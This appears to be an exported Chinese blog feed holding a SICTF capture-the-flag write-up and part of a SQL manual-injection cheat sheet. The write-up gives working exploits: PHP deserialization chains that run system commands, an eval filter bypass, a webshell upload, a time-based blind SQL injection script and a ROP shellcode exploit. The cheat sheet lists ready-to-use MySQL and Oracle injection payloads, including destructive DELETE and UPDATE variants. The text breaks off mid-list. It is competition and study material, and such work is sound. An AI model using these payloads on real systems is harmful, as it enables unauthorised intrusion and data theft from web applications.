<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118165349911.png?x-oss-process=hzy" alt="image-20230118165349911"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118165355425.png?x-oss-process=hzy" alt="image-20230118165355425"></p>
<p>flag：SICTF{she1l_7d7c23e87b47368b_c0rRect!!!}</p>
<h1 id="web">Web</h1>
<h2 id="兔年大吉">兔年大吉</h2>
<p>题目源码如下</p>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
error_reporting(0);

class Happy&#123;
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    &#123;
        $this-&gt;cmd = $cmd;
        $this-&gt;content = $content;
    &#125;

    public function __call($name, $arguments)
    &#123;
        call_user_func($this-&gt;cmd, $this-&gt;content);
    &#125;

    public function __wakeup()
    &#123;
        die(&quot;Wishes can be fulfilled&quot;);
    &#125;
&#125;

class Nevv&#123;
    private $happiness;

    public function __invoke()
    &#123;
        return $this-&gt;happiness-&gt;check();
    &#125;

&#125;

class Rabbit&#123;
    private $aspiration;
    public function __set($name,$val)&#123;
        return $this-&gt;aspiration-&gt;family;
    &#125;
&#125;

class Year&#123;
    public $key;
    public $rabbit;

    public function __construct($key)
    &#123;
        $this-&gt;key = $key;
    &#125;

    public function firecrackers()
    &#123;
        return $this-&gt;rabbit-&gt;wish = &quot;allkill QAQ&quot;;
    &#125;

    public function __get($name)
    &#123;
        $name = $this-&gt;rabbit;
        $name();
    &#125;

    public function __destruct()
    &#123;
        if ($this-&gt;key == &quot;happy new year&quot;) &#123;
            $this-&gt;firecrackers();
        &#125;else&#123;
            print(&quot;Welcome 2023!!!!!&quot;);
        &#125;
    &#125;
&#125;

if (isset($_GET[&#x27;pop&#x27;])) &#123;
    $a = unserialize($_GET[&#x27;pop&#x27;]);
&#125;else &#123;
    echo &quot;过新年啊~过个吉祥年~&quot;;
&#125;
?&gt; 过新年啊~过个吉祥年~</code></pre>
<p>pop反序列化，exp如下</p>
<pre><code class="hljs plaintext">&lt;?php
class Happy&#123;
    private $cmd=&quot;system&quot;;
    private $content=&quot;tac /f*&quot;;


&#125;

class Nevv&#123;
    private $happiness;
    public function __construct($happiness)
    &#123;
        $this-&gt;happiness = $happiness;
    &#125;

&#125;

class Rabbit&#123;
    private $aspiration;
    public function __construct($aspiration)
    &#123;
        $this-&gt;aspiration = $aspiration;
    &#125;

&#125;

class Year&#123;
    public $key= &quot;happy new year&quot;;
    public $rabbit;
&#125;


$year = new Year;
$year1 = new Year;
$happy = new Happy;
$rabbit = new Rabbit($year1);
$year-&gt;rabbit = $rabbit;
$nevv = new Nevv($happy);
$year1-&gt;rabbit = $nevv;
echo urlencode(serialize($year));</code></pre>
<blockquote>
<p>pop=O%3A4%3A%22Year%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A14%3A%22happy+new+year%22%3Bs%3A6%3A%22rabbit%22%3BO%3A6%3A%22Rabbit%22%3A1%3A%7Bs%3A18%3A%22%00Rabbit%00aspiration%22%3BO%3A4%3A%22Year%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A14%3A%22happy+new+year%22%3Bs%3A6%3A%22rabbit%22%3BO%3A4%3A%22Nevv%22%3A1%3A%7Bs%3A15%3A%22%00Nevv%00happiness%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A10%3A%22%00Happy%00cmd%22%3Bs%3A6%3A%22system%22%3Bs%3A14%3A%22%00Happy%00content%22%3Bs%3A7%3A%22tac+%2Ff%2A%22%3B%7D%7D%7D%7D%7D</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230116180546891.png?x-oss-process=hzy" alt="image-20230116180546891"></p>
<p>SICTF{a4efe7e9-ce2a-4d4e-8d16-1a3a88087468}</p>
<h2 id="ezbypass">ezbypass</h2>
<p>源码如下</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST[&#x27;code&#x27;])) &#123;
    $code = $_POST[&#x27;code&#x27;];
    if (strlen($code) &lt;= 105)&#123;
        if (is_string($code)) &#123;
            if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,$code))&#123;
                eval($code);
            &#125; else &#123;
                echo &quot;Hacked!&quot;;
            &#125;
        &#125; else &#123;
            echo &quot;You need to pass in a string&quot;;
        &#125;
    &#125; else &#123;
            echo &quot;long?&quot;;
    &#125;
&#125;</code></pre>
<p>自增构造exp</p>
<pre><code class="hljs plaintext">code=$_=(_/_._)[_];$_%2B%2B;$%FA=$_.$_%2B%2B;$_%2B%2B;$_%2B%2B;$_=_.$%FA.%2B%2B$_.%2B%2B$_;$$_[_]($$_[%FA]);&amp;_=system&amp;%FA=cat /flag</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119172113180.png?x-oss-process=hzy" alt="image-20230119172113180"></p>
<p>SICTF{1c4fe9ba-0a25-42cf-9e92-670ea5574109}</p>
<h2 id="ezupload">ezupload</h2>
<p>文件上传题目，源码如下</p>
<pre><code class="hljs plaintext">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
&lt;/head&gt;
&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;
    &lt;p&gt;骇人过滤,其实没用x&lt;p&gt;
        &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;
        &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;
&lt;/form&gt;
&lt;/html&gt;


&lt;?php
@error_reporting(0);
date_default_timezone_set(&#x27;America/Los_Angeles&#x27;);
highlight_file(__FILE__);
if (isset($_POST[&#x27;submit&#x27;]))&#123;
    $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);
    $black = array(&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
    $file_ext = strrchr($file_name, &#x27;.&#x27;);
    $file_ext = strtolower($file_ext);

    if (!in_array($file_ext, $black))&#123;
        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];
        $img_path = &#x27;upload&#x27;.&#x27;/&#x27;.date(&quot;His&quot;).rand(114,514).$file_ext;

        if (move_uploaded_file($temp_file, $img_path)) &#123;
            $is_upload = true;
        &#125; else &#123;
            $msg = &#x27;上传出错！&#x27;;
        &#125;
    &#125;else &#123;
        $msg = &#x27;你传啥玩意？？&#x27;;
    &#125;
&#125;
if($is_upload)&#123;
    echo &#x27;呀,（传）进去了欸~&#x27;;
&#125;
?&gt;</code></pre>
<p>其实就是可以直接上传php文件，只不过他会根据上传时间进行重命名，一个比较简单的方法就是本地搭建题目并上传文件然后根据两次上传文件确定文件名区间，然后进行爆破即可</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230117183925092.png?x-oss-process=hzy" alt="image-20230117183925092"></p>
<p>所以只需要爆破这之间的文件名即可找到文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720230117184015.jpg?x-oss-process=hzy" alt="QQ图片20230117184015"></p>
<p>访问得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720230117184226.png?x-oss-process=hzy" alt="QQ图片20230117184226"></p>
<p>SICTF{a5e4cf4c-d079-4183-a73e-0ad9a3177ef8}</p>
<h2 id="ssti">SSTI</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118185912667.png?x-oss-process=hzy" alt="image-20230118185912667"></p>
<p>考察ssti，简单fuzz发现几乎魔术方法都被过滤了</p>
<blockquote>
<p>其次就是括号也被过滤了</p>
</blockquote>
<p>用print可以直接输出执行结果</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118190247928.png?x-oss-process=hzy" alt="image-20230118190247928"></p>
<p>刚开始不知道其实只是过滤的小写，用的引号拼接，后面几个发现是可以用大小写来进行绕过的</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230118190223793.png?x-oss-process=hzy" alt="image-20230118190223793"></p>
<p>SICTF{66f402ab-6069-4d8c-99c9-0ff147095f7c}</p>
<h2 id="ezphp">ezphp</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119140822711.png?x-oss-process=hzy" alt="image-20230119140822711"></p>
<p>登录框多半就是sql注入</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119140846121.png?x-oss-process=hzy" alt="image-20230119140846121"></p>
<p>直接输入admin的话是不行的，被过滤了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119140905136.png?x-oss-process=hzy" alt="image-20230119140905136"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119140954841.png?x-oss-process=hzy" alt="image-20230119140954841"></p>
<p>fuzz发现select，union这样的都被过滤了，双写可以绕过去，执行发现存在时间盲注</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119165550694.png?x-oss-process=hzy" alt="image-20230119165550694"></p>
<p>同时需要去使用引号进行闭合，防止sql语句报错</p>
<p>明确了之后写个脚本直接跑就行了</p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">import requests
import time
import datetime

url = &quot;http://ea9c3e41-d118-4851-9146-dfe0c28eb468.ctf.qsnctf.com:8080/login.php&quot;

def get_dbname():
    db_name = &#x27;&#x27;
    for i in range(1,9):
        for k in range(32,127):
            database_payload = &#123;&quot;user&quot;:&quot;&#x27;/**/or/**/if(ascii(substr(database(),%d,1))/**/regexp/**/%d,sleep(2),1)#&#x27;&quot;%(i,k),&quot;pass&quot;:&quot;guli&quot;,&quot;submit&quot;:&quot;login&quot;&#125;
            time1 = datetime.datetime.now()
            res = requests.post(url,database_payload)
            time2 = datetime.datetime.now()
            difference = (time2-time1).seconds
            #print(difference)
            if difference &gt; 1:
                db_name += chr(k)
                print(db_name)
            #else:
                #print(&quot;next&quot;)

def get_table():
    table1 = &#x27;&#x27;
    table2 = &#x27;&#x27;
    table3 = &#x27;&#x27;
    table4 = &#x27;&#x27;
    for i in range(5):
        for j in range(6):
            for k in range(32,127):
                table_payload = &#123;&quot;user&quot;:&quot;&#x27;/**/or/**/if(ascii(substr((seselectlect/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/&#x27;ctf_db&#x27;/**/limit/**/%d,1),%d,1))/**/regexp/**/%d,sleep(2),1)#&#x27;&quot;%(i,j,k),&quot;pass&quot;:&quot;1&quot;,&quot;submit&quot;:&quot;login&quot;&#125;
                time1 = datetime.datetime.now()
                res = requests.post(url,table_payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                #print(difference)
                if difference &gt; 1:
                    if i == 0:
                        table1 += chr(k)
                        print(table1)
                    if i == 1:
                        table2 += chr(k)
                        print(table2)
                    if i == 2:
                        table3 += chr(k)
                        print(table3)
                    if i == 3:
                        table4 += chr(k)
                        print(table4)
                    else:
                        continue


def get_column():
    column1 = &#x27;&#x27;
    column2 = &#x27;&#x27;
    column3 = &#x27;&#x27;
    column4 = &#x27;&#x27;
    for i in range(30):
        for j in range(30):
            for k in range(32,127):
                column_payload = &#123;&quot;user&quot;:&quot;&#x27;/**/or/**/if(ascii(substr((seselectlect/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/&#x27;flag&#x27;/**/limit/**/%d,1),%d,1))/**/regexp/**/%d,sleep(2),1)#&#x27;&quot;%(i,j,k),&quot;pass&quot;:&quot;1&quot;,&quot;submit&quot;:&quot;login&quot;&#125;
                time1 = datetime.datetime.now()
                res = requests.post(url,column_payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference &gt; 1:
                    if i == 0:
                        column1 += chr(k)
                        print(column1)
                    if i == 1:
                        column2 += chr(k)
                        print(column2)
                    if i == 2:
                        column3 += chr(k)
                        print(column3)
                    if i == 3:
                        column4 += chr(k)
                        print(column4)
                    if i == 4:
                        column4 += chr(k)
                        print(column4)
                    else:
                        continue
                    print(&quot;结束&quot;)


def get_flag():
    flag = &#x27;&#x27;
    for i in range(30):
        for k in range(32,127):
            flag_payload = &#123;&quot;user&quot;:&quot;&#x27;/**/or/**/if(ascii(substr((seselectlect/**/password/**/from/**/admin),%d,1))/**/regexp/**/%d,sleep(2),1)#&#x27;&quot;%(i,k),&quot;pass&quot;:&quot;1&quot;,&quot;submit&quot;:&quot;login&quot;&#125;
            time1 = datetime.datetime.now()
            res = requests.post(url,flag_payload)
            time2 = datetime.datetime.now()
            difference = (time2-time1).seconds
            if difference &gt; 1:
                flag += chr(k)
                print(flag)
            else:
                continue


get_dbname()
get_table()
get_column()
get_flag()
</code></pre>
<p>这里应该是有个陷阱就是能跑出来个字段是FLAG_COLUMN,但是跑不出来啥，结合上面看到的那个执行的sql语句可以猜测就是passowrd字段，然后爆内容得到密码0909876qwe222</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119170010288.png?x-oss-process=hzy" alt="image-20230119170010288"></p>
<p>然后登录，发现是测试url，随便输一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119170119210.png?x-oss-process=hzy" alt="image-20230119170119210"></p>
<p>得到源码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119170146252.png?x-oss-process=hzy" alt="image-20230119170146252"></p>
<p>一眼顶针，file_get_contents直接用伪协议读取，以及那个提示文件//x9sd.php</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119170246703.png?x-oss-process=hzy" alt="image-20230119170246703"></p>
<p>解码得到源码</p>
<pre><code class="hljs plaintext">&lt;?php

class a &#123;
    protected $cmd;
    function __destruct()
    &#123;       echo $this-&gt;cmd;
       @eval($this-&gt;cmd);
        
    &#125;
&#125;

if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;unserx&#x27;]))&#123;
   $var = base64_decode($_GET[&#x27;unserx&#x27;]);
          
    if($_GET[&#x27;username&#x27;] === &quot;admin&quot;)&#123;
        echo &quot;nonono?&quot;;
    &#125;
    $username = urldecode($_GET[&#x27;username&#x27;]);
    if($username === &quot;admin&quot;)&#123;
        unserialize($var);
    &#125;
    unserialize($var);
    echo(&quot;success&quot;);
&#125;else&#123;
    echo &quot;I need some ???&quot;;
&#125;</code></pre>
<p>一眼顶针，执行命令就行，简单绕一下根据规则进行构造</p>
<p>exp如下</p>
<pre><code class="hljs plaintext">&lt;?php

class a &#123;
    protected $cmd=&quot;system(&#x27;cat /flag&#x27;);&quot;;
    function __destruct()
    &#123;   echo $this-&gt;cmd;
        echo @eval($this-&gt;cmd);

    &#125;
&#125;
$guli=new a();
echo base64_encode(serialize($guli));
//TzoxOiJhIjoxOntzOjY6IgAqAGNtZCI7czoyMDoic3lzdGVtKCdjYXQgL2ZsYWcnKTsiO30=system(&#x27;cat /flag&#x27;);</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230119170416052.png?x-oss-process=hzy" alt="image-20230119170416052"></p>
<p>得到flag  SICTF{be48b967-59fe-4e8a-8604-b05d3982198a}</p>
<h1 id="crypto">CRYPTO</h1>
<h2 id="ascii">Ascii</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">from flag import flag
import base64
flag=str(base64.b32encode(base64.b64encode(flag)))
for i in flag:
    print(chr(ord(i)^3),end=&#x27;&#x27;)
#a$HVZDZQ@TJUMGLVHZIYUF1U0NNYDURWWDNM6FFYP1OA[TRPHWJZ7R&gt;&gt;&gt;&gt;$</code></pre>
<p>就是简单加密，先是异或然后base64加密再base32加密</p>
<p>解密脚本逆一下就行了</p>
<pre><code class="hljs plaintext">import base64
m = &#x27;a$HVZDZQ@TJUMGLVHZIYUF1U0NNYDURWWDNM6FFYP1OA[TRPHWJZ7R&gt;&gt;&gt;&gt;$&#x27;
flag = &#x27;&#x27;
for i in m:
    flag += chr(ord(i) ^ 3)
flag = flag[2:-1]
print(base64.b64decode(base64.b32decode(flag)))</code></pre>
<p>b’SICTF{Asc1i_1s_s0_ez!!!}’</p>
<h1 id="pwn">PWN</h1>
<h2 id="cna2y">C@na2y</h2>
<p>EXP如下</p>
<pre><code class="hljs plaintext">from pwn import *
context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;)
p = remote(&#x27;ctf.qsnctf.com&#x27;, 10783)
#p = process(&#x27;./ppp&#x27;)

pop=0x08049b9b
ret=0x08061f4b
read_addr=0x806CD20
mprotect_addr=0x806DC10
bss_addr=0x80db000
win=0x80488DE
ex=0x0804EE60
write_addr=0x806CDF0
p.recvuntil(&quot;Do you really know Canary?\n&quot;)
payload=b&#x27;a&#x27;*(0x18+4)+p32(mprotect_addr)+p32(ret)+p32(bss_addr) + p32(0x1000)+p32(0x7)+p32(read_addr)+p32(ret)+p32(0)+p32(bss_addr)+p32(0x1000)+p32(bss_addr)
#gdb.attach(p)
#pause()
p.sendline(payload) 
shellcode=asm(shellcraft.sh(),arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)  #生成shellcode
p.sendline(shellcode)

p.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230116205237021.png?x-oss-process=hzy" alt="image-20230116205237021"></p>
<p>SICTF{eb14559a-b6b5-459c-9b92-ae7ab3493398}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL手注小记</title>
    <url>/2023/08/07/SQL%E6%89%8B%E6%B3%A8%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>SQL手注常用的语句,在这里记录一下方便后续直接用了</p>
<span id="more"></span>
<p>一大早看见一个公众号的推文,SQL手注总结的不错,抄过来记录一下,以后遇到直接来取了直接用了</p>
<h2 id="0x01-mysql-手工注入">0x01 Mysql 手工注入</h2>
<h3 id="11-联合注入">1.1 联合注入</h3>
<pre><code class="hljs plaintext">Copy?id=1&#x27; order by 4--+
?id=0&#x27; union select 1,2,3,database()--+
?id=0&#x27; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+
?id=0&#x27; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; --+
#group_concat(column_name) 可替换为 unhex(Hex(cast(column_name+as+char)))column_name

?id=0&#x27; union select 1,2,3,group_concat(password) from users --+
#group_concat 可替换为 concat_ws(&#x27;,&#x27;,id,users,password )

?id=0&#x27; union select 1,2,3,password from users limit 0,1--+</code></pre>
<h3 id="12-报错注入">1.2 报错注入</h3>
<pre><code class="hljs plaintext">Copy1.floor()
select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

2.extractvalue()
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

3.updatexml()
select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

4.geometrycollection()
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

5.multipoint()
select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

6.polygon()
select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

7.multipolygon()
select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

8.linestring()
select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

9.multilinestring()
select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

10.exp()
select * from test where id=1 and exp(~(select * from(select user())a));</code></pre>
<p>每个一个报错语句都有它的原理：</p>
<p>exp() 报错的原理：exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。</p>
<p>updatexml() 报错的原理：由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p>
<pre><code class="hljs plaintext">Copy爆库：?id=1&#x27; and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +
爆表：?id=1&#x27; and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),1) -- +
爆字段：?id=1&#x27; and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +
爆数据：?id=1&#x27; and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +

#concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</code></pre>
<p>这里需要注意的是它加了连接字符，导致数据中的 md5 只能爆出 31 位，这里可以用分割函数分割出来：</p>
<pre><code class="hljs plaintext">Copysubstr(string string,num start,num length);
#string为字符串,start为起始位置,length为长度

?id=1&#x27; and updatexml(1,concat(0x7e, substr((select password from users limit 1,1),1,16),0x7e),1) -- +</code></pre>
<h3 id="13-盲注">1.3 盲注</h3>
<h4 id="131-时间盲注">1.3.1 时间盲注</h4>
<p>时间盲注也叫延时注入 一般用到函数 sleep() BENCHMARK() 还可以使用笛卡尔积(尽量不要使用,内容太多会很慢很慢)</p>
<p>一般时间盲注我们还需要使用条件判断函数</p>
<pre><code class="hljs plaintext">Copy#if（expre1，expre2，expre3）
当 expre1 为 true 时，返回 expre2，false 时，返回 expre3 

#盲注的同时也配合着 mysql 提供的分割函
substr、substring、left</code></pre>
<p>我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号，常用到的就有 ascii() hex() 等等</p>
<pre><code class="hljs plaintext">Copy?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+
?id=1&#x27; and if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(5),1)--+</code></pre>
<h4 id="132-布尔盲注">1.3.2 布尔盲注</h4>
<pre><code class="hljs plaintext">Copy?id=1&#x27; and substr((select user()),1,1)=&#x27;r&#x27; -- +
?id=1&#x27; and IFNULL((substr((select user()),1,1)=&#x27;r&#x27;),0) -- +
#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值

?id=1&#x27; and strcmp((substr((select user()),1,1)=&#x27;r&#x27;),1) -- +
#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1</code></pre>
<h3 id="14-insertdeleteupdate">1.4 insert,delete,update</h3>
<p>insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般较难发现，我们可以尝试性插入、引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p>
<h4 id="141-报错">1.4.1 报错</h4>
<pre><code class="hljs plaintext">Copymysql&gt; insert into admin (id,username,password) values (2,&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;,&quot;admin&quot;);
Query OK, 1 row affected (0.00 sec)

mysql&gt; select * from admin;
+------+-----------------------------------------------+----------+
| id   | username                                      | password |
+------+-----------------------------------------------+----------+
|    1 | admin                                         | admin    |
|    1 | and 1=1                                       | admin    |
|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |
+------+-----------------------------------------------+----------+
3 rows in set (0.00 sec)

mysql&gt; insert into admin (id,username,password) values (2,&quot;&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;&quot;,&quot;admin&quot;);
ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.53&#x27;

#delete 注入很危险，很危险，很危险，切记不能使用 or 1=1 ，or 右边一定要为false
mysql&gt; delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);
ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.53&#x27;</code></pre>
<h4 id="142-盲注">1.4.2 盲注</h4>
<pre><code class="hljs plaintext">Copy#int型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等
mysql&gt; insert into admin values (2+if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(5),1),&#x27;1&#x27;,&quot;admin&quot;);
Query OK, 1 row affected (5.00 sec)

mysql&gt; insert into admin values (2+if((substr((select user()),1,1)=&#x27;p&#x27;),sleep(5),1),&#x27;1&#x27;,&quot;admin&quot;);
Query OK, 1 row affected (0.00 sec)

#字符型注意闭合不能使用and
mysql&gt; insert into admin values (2,&#x27;&#x27;+if((substr((select user()),1,1)=&#x27;p&#x27;),sleep(5),1)+&#x27;&#x27;,&quot;admin&quot;);
Query OK, 1 row affected (0.00 sec)

mysql&gt; insert into admin values (2,&#x27;&#x27;+if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(5),1)+&#x27;&#x27;,&quot;admin&quot;);
Query OK, 1 row affected (5.01 sec)

# delete 函数 or 右边一定要为 false
mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#x27;r4&#x27;),sleep(5),0);
Query OK, 0 rows affected (0.00 sec)

mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(5),0);
Query OK, 0 rows affected (5.00 sec)

#update 更新数据内容
mysql&gt; select * from admin;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    2 | 1        | admin    |
|    2 | 1        | admin    |
|    2 | 1        | admin    |
|    2 | admin    | admin    |
+------+----------+----------+
4 rows in set (0.00 sec)

mysql&gt; update admin set id=&quot;5&quot;+sleep(5)+&quot;&quot; where id=2;
Query OK, 4 rows affected (20.00 sec)
Rows matched: 4  Changed: 4  Warnings: 0</code></pre>
<h3 id="15-二次注入与宽字节注入">1.5 二次注入与宽字节注入</h3>
<p>二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码他，这样就不会带有单引号等。</p>
<pre><code class="hljs plaintext">Copymysql&gt; insert into admin (id,name,pass) values (&#x27;3&#x27;,0x61646d696e272d2d2b,&#x27;11&#x27;);
Query OK, 1 row affected (0.00 sec)

mysql&gt; select * from admin;
+----+-----------+-------+
| id | name      | pass  |
+----+-----------+-------+
|  1 | admin     | admin |
|  2 | admin&#x27;111 | 11111 |
|  3 | admin&#x27;--+ | 11    |
+----+-----------+-------+
4 rows in set (0.00 sec)</code></pre>
<p>二次注入在没有源码的情况比较难发现，通常见于注册，登录恶意账户后，数据库可能会因为恶意账户名的问题，将 admin’–+ 误认为 admin 账户</p>
<p>宽字节注入：针对目标做了一定的防护，单引号转变为 <code>\'</code> , mysql 会将 <code>\</code> 编码为 <code>%5c</code> ，宽字节中两个字节代表一个汉字，所以把 <code>%df</code> 加上 <code>%5c</code> 就变成了一个汉字“運”，使用这种方法成功绕过转义，就是所谓的宽字节注入</p>
<pre><code class="hljs plaintext">Copyid=-1%df&#x27; union select...

#没使用宽字节
%27 -&gt; %5C%27 

#使用宽字节
%df%27 -&gt; %df%5c%27 -&gt; 運&#x27;</code></pre>
<h2 id="0x02-oracle-手工注入">0x02 Oracle 手工注入</h2>
<h3 id="21-联合注入">2.1 联合注入</h3>
<pre><code class="hljs plaintext">Copy?id=-1&#x27; union select user,null from dual--
?id=-1&#x27; union select version,null from v$instance--
?id=-1&#x27; union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--
?id=-1&#x27; union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name =&#x27;USERS&#x27;) where limit=2)--
?id=-1&#x27; union select username,passwd from users--
?id=-1&#x27; union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit=3)--</code></pre>
<h3 id="22-报错注入">2.2 报错注入</h3>
<pre><code class="hljs plaintext">Copy?id=1&#x27; and 1=ctxsys.drithsx.sn(1,(select user from dual))--
